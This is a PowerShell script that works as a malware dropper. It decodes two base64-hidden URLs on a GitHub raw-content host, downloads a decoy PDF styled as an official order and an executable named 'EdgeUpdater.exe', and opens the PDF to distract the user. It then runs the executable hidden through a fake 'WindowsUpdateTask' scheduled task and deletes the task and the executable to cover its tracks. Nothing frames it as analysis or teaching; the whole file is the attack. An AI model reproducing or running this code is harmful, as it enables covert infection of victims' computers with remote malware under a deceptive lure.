$ErrorActionPreference = 'SilentlyContinue'

$r = Get-Random -Minimum 500 -Maximum 3000
Start-Sleep -Milliseconds $r

$cache = "$env:APPDATA\Microsoft\Windows\Caches"
if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }

$pdfUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWthel9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LnBkZg=='))
$exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9FZGdlVXBkYXRlci5leGU='))
$pdfOut = "$cache\doc.pdf"
$exeOut = "$cache\helper.exe"

$headers = @{
    'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    'Accept' = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
}
Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfOut -Headers $headers -UseBasicParsing
Start-Sleep -Milliseconds (Get-Random -Min 300 -Max 1500)
Invoke-WebRequest -Uri $exeUrl -OutFile $exeOut -Headers $headers -UseBasicParsing

Start-Process $pdfOut

$taskName = "WindowsUpdateTask" + (Get-Random -Maximum 9999)
$action = New-ScheduledTaskAction -Execute $exeOut -Argument "-hidden"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2)
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
Start-ScheduledTask -TaskName $taskName
Start-Sleep -Seconds 5
Unregister-ScheduledTask -TaskName $taskName -Confirm:$false

Start-Sleep -Seconds 60
Remove-Item $exeOut -Force -ErrorAction SilentlyContinue
